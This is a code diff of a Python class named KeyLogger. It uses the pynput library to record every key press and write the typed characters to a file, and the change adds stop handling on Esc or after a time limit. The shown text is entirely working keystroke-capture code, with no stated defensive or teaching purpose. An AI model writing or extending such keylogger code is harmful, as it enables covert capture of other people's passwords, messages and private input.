@@ -25,9 +25,6 @@ class KeyLogger:
             with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
                 listener.join()
 
-            # if self.currentTime > self.stoppingTime:
-
-
     def on_press(self, key):
         print(key)
         self.keys.append(key)
@@ -43,15 +40,15 @@ class KeyLogger:
                 k = str(key).replace("'", "")
                 if k.find("space") > 0:
                     f.write('\n')
-                    # f.close()
                 elif k.find("Key") == -1:
                     f.write(k)
-                    # f.close()
 
     def on_release(self, key):
         if key == Key.esc:
+            self.after_stop()
             return False
         if self.currentTime > self.stoppingTime:
+            self.after_stop()
             return False
 
     def after_stop(self):
